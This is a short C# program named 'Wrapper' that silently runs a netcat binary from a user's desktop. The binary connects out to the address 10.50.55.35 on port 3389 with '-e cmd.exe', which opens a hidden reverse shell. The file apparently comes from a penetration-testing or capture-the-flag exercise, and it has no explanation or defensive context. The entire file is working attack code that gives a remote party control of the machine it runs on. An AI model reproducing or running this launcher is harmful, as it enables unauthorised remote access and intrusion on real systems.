using System;
using System.Diagnostics;

namespace Wrapper{
    class Program{
        static void Main(){
            	Process proc = new Process();
		ProcessStartInfo procInfo = new ProcessStartInfo("c:\\users\\thomas\\desktop\\nc64.exe", "10.50.55.35 3389 -e cmd.exe");
		procInfo.CreateNoWindow = true;
		proc.StartInfo = procInfo;
		proc.Start();
        }
    }
}
